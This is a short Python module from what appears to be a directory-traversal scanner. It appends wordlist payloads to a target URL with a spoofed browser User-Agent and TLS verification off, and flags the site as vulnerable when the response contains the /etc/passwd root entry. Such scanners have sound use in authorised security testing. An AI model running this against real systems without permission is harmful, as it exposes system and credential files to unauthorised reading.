import os
import requests
import datetime
from progress.bar import Bar


def dTraversal(link):
    print("##########################################")
    print("Scanner Bug Directory Traversal")
    print("##########################################")
    with open('././wordlist/directorytraversal.txt','r') as py:
        wordlist_dTraversal = py.readlines()

    headers = {

        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'
    }
    bar = Bar('Progress Scanner Sedang Berjalan', max=1533 )
    for b in range(0,len(wordlist_dTraversal)):
        pay = wordlist_dTraversal[b].rstrip('\n') 
        bar.next()
        try:
            req2 = requests.get(link+pay, headers = headers, timeout=10,verify=False)
            if 'root:x:0:0:root:/root:/bin/bash' in str(req2.content):
                print("\n\n######################### Link Vuln Bug Directory Traversal #########################\n")
                print("{} : {} Vuln! \n".format(req2.url,req2.status_code))
                print("#####################################################################################\n")
                break
            elif req2.status_code == 403:
                print("\n{} : {} Forbidden".format(req2.url,req2.status_code))
            elif req2.status_code == 500:
                print("\n{} : {} Server Error".format(req2.url,req2.status_code))
        except requests.exceptions.RequestException as e:
            print(e)
    bar.finish()
    print("Scanner Selesai")